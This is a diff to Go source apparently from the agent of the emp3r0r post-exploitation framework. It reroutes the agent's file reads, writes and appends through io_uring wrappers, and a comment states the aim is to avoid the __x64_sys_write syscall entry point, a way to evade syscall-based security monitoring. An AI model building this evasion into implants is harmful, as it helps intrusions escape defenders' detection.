@@ -18,6 +18,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
+	"github.com/jm33-m0/emp3r0r/core/lib/uring"
 )
 
 // memfsPrefix is the only scheme for the in-memory filesystem. All memfs keys
@@ -910,7 +911,7 @@ func spillMemfsFile(key string) {
 		logging.Warningf("memfs: cannot create spill file for %s (%v); keeping in RAM", key, err)
 		return
 	}
-	if err := os.WriteFile(path, data, 0o600); err != nil {
+	if err := uring.WriteFile(path, data, 0o600); err != nil {
 		logging.Warningf("memfs: spill of %s failed (%v); keeping in RAM", key, err)
 		_ = os.Remove(path)
 		return
@@ -1066,7 +1067,9 @@ func SaveFileAgent(filename string, data []byte, perm os.FileMode, strategy Stor
 		return fmt.Errorf("WriteFileAgent mkdir %s: %v", filepath.Dir(filename), err)
 	}
 
-	return os.WriteFile(filename, data, perm)
+	// io_uring keeps the content write off the __x64_sys_write entry point;
+	// uring.WriteFile falls back to os when unavailable.
+	return uring.WriteFile(filename, data, perm)
 }
 
 // ReadFileAgent reads a file from the agent's filesystem
@@ -1093,7 +1096,7 @@ func ReadFileAgent(filename string) ([]byte, error) {
 		}
 
 		if isSpilled {
-			data, err = os.ReadFile(spillPath)
+			data, err = uring.ReadFile(spillPath)
 			if err != nil {
 				return nil, fmt.Errorf("memfs: read spill for %s: %v", filename, err)
 			}
@@ -1111,7 +1114,7 @@ func ReadFileAgent(filename string) ([]byte, error) {
 		return data, nil
 	}
 
-	data, err = os.ReadFile(filename)
+	data, err = uring.ReadFile(filename)
 	if err != nil {
 		return nil, err
 	}
@@ -1197,16 +1200,17 @@ func AppendToFileAgent(filename string, data []byte) error {
 		return WriteFileAgent(filename, newData, 0o600)
 	}
 
-	f, err := OpenFileAgent(filename, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
-	if err != nil {
-		return err
-	}
-	defer f.Close()
+	return appendPlainAgent(filename, data)
+}
 
-	if _, err = f.Write(data); err != nil {
-		return err
+// appendPlainAgent appends plaintext through the io_uring path, preserving the
+// directory-preparation and pattern-expansion behaviour of OpenFileAgent.
+func appendPlainAgent(filename string, data []byte) error {
+	filename = ApplyFilePattern(filename)
+	if err := os.MkdirAll(filepath.Dir(filename), 0o700); err != nil {
+		return fmt.Errorf("AppendToFileAgent mkdir %s: %v", filepath.Dir(filename), err)
 	}
-	return nil
+	return uring.AppendFile(filename, data)
 }
 
 // AppendTextToFileAgent is a centralized text appending function for agent operations.
